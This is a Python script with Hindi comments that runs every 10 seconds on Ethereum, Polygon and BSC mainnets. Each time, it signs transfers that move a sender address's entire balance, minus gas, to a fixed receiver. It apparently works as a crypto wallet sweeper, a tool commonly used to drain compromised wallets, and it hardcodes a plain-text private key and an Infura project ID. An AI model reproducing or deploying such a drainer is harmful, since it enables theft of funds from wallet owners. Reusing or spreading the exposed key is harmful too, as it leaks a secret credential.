# main.py
import time
from web3 import Web3
from apscheduler.schedulers.blocking import BlockingScheduler

# ===== आपकी जानकारी =====
PRIVATE_KEY = "ddb3e978e53e72e26105743fb6cbc1223ce93e977059a5d9c54fd55e4312e9d5"
SENDER_ADDRESS = "0x03b1bb3cc74aa22822d401075d497d12c5a397d4"
RECEIVER_ADDRESS = "0x5592F60a5fDf5D4d38870051fd3e5997b8f5baf8"

# ===== मेननेट कॉन्फ़िग =====
CHAINS = {
    "ethereum": {
        "rpc": "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",  # सार्वजनिक Infura ID
        "chain_id": 1,
        "min_balance": 0.00001,
        "symbol": "ETH"
    },
    "polygon": {
        "rpc": "https://polygon-rpc.com",
        "chain_id": 137,
        "min_balance": 0.00001,
        "symbol": "MATIC"
    },
    "bsc": {
        "rpc": "https://bsc-dataseed.binance.org",
        "chain_id": 56,
        "min_balance": 0.00001,
        "symbol": "BNB"
    }
}

def transfer_crypto(chain_name):
    try:
        chain = CHAINS[chain_name]
        w3 = Web3(Web3.HTTPProvider(chain["rpc"]))
        
        if not w3.is_connected():
            print(f"⚠️ {chain_name.upper()} कनेक्शन फेल!")
            return

        # बैलेंस चेक
        balance = w3.eth.get_balance(SENDER_ADDRESS)
        balance_native = w3.from_wei(balance, 'ether')
        
        print(f"\n{chain_name.upper()} बैलेंस: {balance_native:.8f} {chain['symbol']}")
        print(f"न्यूनतम ज़रूरी: {chain['min_balance']} {chain['symbol']}")

        if balance_native > chain["min_balance"]:
            # गैस कैलकुलेशन
            gas_price = w3.eth.gas_price
            gas_limit = 21000
            gas_cost = gas_price * gas_limit
            
            # भेजने योग्य रकम
            amount_to_send = balance - gas_cost
            
            if amount_to_send > 0:
                # ट्रांजैक्शन बनाएँ
                tx = {
                    'nonce': w3.eth.get_transaction_count(SENDER_ADDRESS),
                    'to': RECEIVER_ADDRESS,
                    'value': amount_to_send,
                    'gas': gas_limit,
                    'gasPrice': gas_price,
                    'chainId': chain["chain_id"]
                }
                
                # साइन और भेजें
                signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
                tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                print(f"✅ {chain_name.upper()} ट्रांसफर सफल!")
                print(f"TX हैश: {tx_hash.hex()}")
                print(f"भेजी गई रकम: {w3.from_wei(amount_to_send, 'ether'):.8f} {chain['symbol']}")
            else:
                print(f"⚠️ {chain_name} पर गैस फीस के लिए बैलेंस कम है")
        else:
            print(f"❌ {chain_name} पर बैलेंस कम है")
    
    except Exception as e:
        print(f"🔥 {chain_name.upper()} त्रुटि: {str(e)}")
        time.sleep(5)  # गलती होने पर 5 सेकंड रुकें

def auto_transfer_job():
    print("\n" + "="*60)
    print(f"🔄 ऑटो ट्रांसफर चेक | {time.ctime()}")
    print("="*60)
    for chain in CHAINS:
        transfer_crypto(chain)

# हर 10 सेकंड पर चलाएँ (मेननेट के लिए सुरक्षित)
scheduler = BlockingScheduler()
scheduler.add_job(auto_transfer_job, 'interval', seconds=10)
print("\n🤖 मेननेट बॉट शुरू! हर 10 सेकंड में चेक करेगा")
print("🔁 Ethereum, Polygon, BSC मेननेट पर निगरानी")
print(f"👤 भेजने वाला: {SENDER_ADDRESS}")
print(f"🎯 प्राप्तकर्ता: {RECEIVER_ADDRESS}")
print("🛑 रोकने के लिए Ctrl+C दबाएँ")
scheduler.start()
